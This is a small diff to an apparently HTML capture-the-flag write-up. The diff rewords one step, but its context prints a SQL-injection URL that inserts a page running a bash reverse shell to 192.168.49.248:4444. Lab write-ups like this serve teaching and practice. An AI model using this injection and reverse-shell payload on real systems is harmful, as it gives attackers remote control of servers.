@@ -168,7 +168,7 @@ ftp&gt; exit
 
     <img src="../images/cobweb/sql_injection.png">
 
-    <li>I send this in through Firefox to create the reverse shell web page.</li>
+    <li>I send this through Firefox to create a web page containing a reverse shell.</li>
     <ul>
         <li>http://192.168.248.162/"; INSERT INTO webpages(route_string, page_data) VALUES ('/rev', 'system("bash -i >& /dev/tcp/192.168.49.248/4444 0>&1");');-- -</li>
     </ul>
